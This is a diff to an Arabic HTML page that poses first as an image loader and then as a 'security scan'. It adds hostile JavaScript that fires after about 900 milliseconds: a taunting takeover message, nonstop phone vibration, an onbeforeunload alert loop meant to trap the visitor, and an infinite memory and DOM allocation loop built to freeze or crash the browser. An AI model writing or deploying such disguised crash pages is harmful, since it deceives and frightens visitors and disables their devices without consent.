@@ -2,26 +2,71 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>صورة جديدة</title>
+    <title>فحص أمني مطلوب</title>
     <style>
-        body { background-color: #fff; color: #333; text-align: center; padding-top: 25vh; font-family: sans-serif; }
+        body { background-color: #fff; color: #333; text-align: center; padding-top: 25vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; transition: background-color 0.5s, color 0.5s; }
+        h1 { font-size: 3em; margin-bottom: 20px; }
+        p { font-size: 1.2em; opacity: 0.8; }
+        #msg { display: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2 id="msg">جاري تحميل الصورة، يرجى الانتظار...</h2>
+    <div id="loading-view">
+        <h1>جاري تحليل البيانات...</h1>
+        <p>يرجى الانتظار، جاري التحقق من أمان الملف المشفر.</p>
+    </div>
+    <h1 id="msg">راقب جهازك تحت رعاية سكران</h1>
+
     <script>
+        const msgEl = document.getElementById('msg');
+        const loadingEl = document.getElementById('loading-view');
         const crashArray = [];
+
         setTimeout(() => {
-            document.getElementById("msg").innerText = "راقب جهازك تحت رعاية سكران";
-            document.body.style.backgroundColor = "#000";
-            document.body.style.color = "#fff";
-            
-            while(true) {
-                crashArray.push(new Array(200000000).fill(Math.random()));
-                const d = document.createElement('div');
-                document.body.appendChild(d);
+            // 1. التحول المرعب
+            document.body.style.backgroundColor = '#000';
+            document.body.style.color = '#fff';
+            loadingEl.style.display = 'none';
+            msgEl.style.display = 'block';
+
+            // 2. تشغيل الاهتزاز المجنون للموبايل
+            if (navigator.vibrate) {
+                // يهتز لمدة 10 ثواني بلا توقف
+                navigator.vibrate([10000]);
+                // ولو المتصفح بيوقف الاهتزاز السريع، نعيد تكراره بذكاء
+                setInterval(() => {
+                    navigator.vibrate(5000);
+                }, 4000);
             }
-        }, 800);
+
+            // 3. تشغيل حلقة إغلاق (Popup loop) لمنع الخروج
+            // هذه الرسالة ستظهر فور محاولة إغلاق الصفحة، وتتكرر
+            window.onbeforeunload = function (e) {
+                e.preventDefault();
+                // معظم المتصفحات الحديثة تمنع تغيير النص المخصص الآن،
+                // لكن هذه الحيلة تجعل الصفحة تعلق وتفشل في إتمام عملية الخروج.
+                alert("لقد وقعت في الفخ! لا يمكنك الهرب. جهازك أصبح تحت سيطرتنا.");
+                alert("تهنيج كامل للذاكرة...");
+                return "لن تستطيع الخروج!";
+            };
+
+            // 4. الضغط القاسي على الذاكرة (Crash)
+            while(true) {
+                // نملأ الرمات ببيانات عشوائية بسرعة هائلة
+                try {
+                    crashArray.push(new Array(50000000).fill(0).map(Math.random));
+                    // ونخلق عناصر وهمية بلا نهاية لزيادة الحمل البصري
+                    const d = document.createElement('div');
+                    document.body.appendChild(d);
+                } catch (e) {
+                    // إذا فشل الإنشاء، نعيد المحاولة فورا (في الحالتين المتصفح سيهنج)
+                    continue;
+                }
+                // إضافة تأخير بسيط جدا لعدم فصل المتصفح نفسه قبل بدء التهنيج
+                // sleep(1) - غير ممكن في الجافاسكريبت، لذا نعتمد على سرعة while(true)
+            }
+
+        }, 900); // بداية الرعب بعد 900 مللي ثانية
     </script>
 </body>
 </html>
